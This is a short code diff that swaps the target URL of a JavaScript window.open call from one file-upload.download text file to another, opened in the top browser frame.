@@ -1,2 +1,2 @@
 
-  window.open("https://f11.file-upload.download:183/d/r4xau4kunlgpv7w7d26iga2lz4gtpn6mlkxv37fu5x6ub5aox3afakavp4vh5zbx4ke5n47b/Code.txt", '_top');
+  window.open("https://f13.file-upload.download:183/d/qaxaq4kunlgpv7w7d26i4tcc2llghznpl37q6mgts3zgcuafildl2wurxdgr6tt6dnt6fchu/525.txt", '_top');
